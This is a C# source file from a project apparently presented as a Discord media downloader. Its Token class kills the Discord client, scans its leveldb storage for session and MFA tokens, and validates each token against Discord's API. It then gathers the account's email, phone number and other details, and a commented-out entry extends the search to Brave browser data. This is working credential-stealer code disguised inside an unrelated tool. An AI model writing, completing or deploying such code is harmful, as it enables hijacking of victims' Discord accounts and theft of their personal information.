using Discord_Media_DL.Misc;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace Discord_Media_DL.Discord
{
    public static class Token
    {
        public struct DiscordUser
        {
            public string Token { get; set; }
            public string ID { get; set; }
            public string Name { get; set; }
            public string Discriminator { get; set; }
            public string Mail { get; set; }
            public string Phone { get; set; }
            public string Bio { get; set; }

            public override string ToString()
            {
                JObject json = new JObject();

                json.Add("token", Token);
                json.Add("id", ID);
                json.Add("name", Name);
                json.Add("discriminator", Discriminator);
                json.Add("mail", Mail);
                json.Add("phone", Phone);
                json.Add("bio", Bio);

                return JsonConvert.SerializeObject(json, Formatting.Indented);
            }
        }

        public struct TokenContainer
        {
            public string ProcessName { get; set; }
            public string TokenFolder { get; set; }

            public TokenContainer(string ProcessName, string TokenFolder)
            {
                if (TokenFolder.EndsWith("\\") == false)
                    TokenFolder += "\\";

                this.ProcessName = ProcessName;
                this.TokenFolder = TokenFolder;
            }
        }

        public static TokenContainer[] TokenLocations
        {
            get => new TokenContainer[]
            {
                new TokenContainer("Discord", Help.Paths.Roaming + @"\Discord\Local Storage\leveldb\"),
                //    new TokenContainer("Brave", Help.Paths.AppDataLocal + @"\BraveSoftware\Brave-Browser\User Data\Default\")
            };
        }

        public static async Task<string[]> FindAllTokens(bool ValidateToken = true)
        {
            List<string> result = new List<string>();

            Task reader = new Task(() =>
            {
                foreach (TokenContainer container in TokenLocations)
                {
                    string path = container.TokenFolder;

                    Help.Processes.KillProcess(container.ProcessName);

                    if (Directory.Exists(path) == false)
                        continue;

                    Help.Directories.ExploreFilesRecursively(path, (string file) =>
                    {
                        if (file.EndsWith(".log") == false && file.EndsWith(".ldb") == false)
                            return;

                        try
                        {
                            foreach (string line in File.ReadAllLines(file))
                            {
                                foreach (Match m in new Regex(@"[\w-]{24}\.[\w-]{6}\.[\w-]{27}").Matches(line))
                                {
                                    if (result.Contains(m.Value))
                                        continue;

                                    if (ValidateToken && IsValidToken(m.Value).Result == false)
                                        continue;

                                    result.Add(m.Value);
                                }

                                foreach (Match m in new Regex(@"mfa\.[\w-]{84}").Matches(line))
                                {
                                    if (result.Contains(m.Value))
                                        continue;

                                    if (ValidateToken && IsValidToken(m.Value).Result == false)
                                        continue;

                                    result.Add(m.Value);
                                }
                            }
                        }
                        catch { }
                    });
                }
            });

            reader.Start();

            await reader;

            return result.ToArray();
        }

        /// <summary>
        /// Returns the Discord Tag associated with this Token. Returns null if the Token is invalid.
        /// </summary>
        /// <param name="Token"></param>
        /// <returns></returns>
        public static async Task<DiscordUser?> GetUserByToken(string Token)
        {
            try
            {
                WebClient client = new WebClient();
                client.Headers.Add("authorization", Token);

                string json = await client.DownloadStringTaskAsync("https://discord.com/api/v9/users/@me");
                
                client.Dispose();

                JObject j = (JObject)JsonConvert.DeserializeObject(json);

                DiscordUser result = new DiscordUser();

                result.Token = Token;
                result.ID = j.GetValue("id").ToString();
                result.Name = j.GetValue("username").ToString();
                result.Discriminator = j.GetValue("discriminator").ToString();
                result.Mail = j.GetValue("email").ToString();
                result.Phone = j.GetValue("phone").ToString();
                result.Bio = j.GetValue("bio").ToString();

                return result;
            }
            catch { }

            return null;
        }

        public static async Task<bool> IsValidToken(string Token)
        {
            try
            {
                WebClient client = new WebClient();
                client.Headers.Add("authorization", Token);

                string json = await client.DownloadStringTaskAsync("https://discord.com/api/v9/users/@me");

                client.Dispose();

                JObject j = (JObject)JsonConvert.DeserializeObject(json);

                // usually it would be enough to simply check if the request goes through
                // just making sure here :)
                return j.ContainsKey("id"); 
            }
            catch { }

            return false;

        }
    }
}
